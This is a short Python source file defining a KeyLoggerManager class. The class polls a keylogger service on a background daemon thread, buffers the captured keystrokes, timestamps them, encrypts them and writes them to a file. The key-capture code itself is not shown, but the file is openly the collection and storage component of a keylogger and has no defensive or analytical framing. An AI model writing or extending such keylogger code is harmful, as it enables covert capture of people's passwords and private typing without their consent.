import threading
import time
from datetime import datetime

class KeyLoggerManager:
    def __init__(self, KeyLoggerServise, FileWriter, encryption, interval=5):
        self.KeyLoggerServise = KeyLoggerServise
        self.FileWriter = FileWriter
        self.encryption = encryption
        self.interval = interval
        self.buffer = []
        self.running = False
        self.thread = None

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()
        self._flush_buffer()

    def _run(self):
        while self.running:
            events = self.KeyLoggerServise.get_logged_keys()
            self.buffer.extend(events)
            if self.buffer:
                self._flush_buffer()
            time.sleep(self.interval)

    def _flush_buffer(self):
        if not self.buffer:
            return
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        raw_data = f"[{timestamp}] {''.join(self.buffer)}"
        encrypted = self.encryption.encrypt(raw_data)
        self.FileWriter.write(encrypted)
        self.buffer.clear()
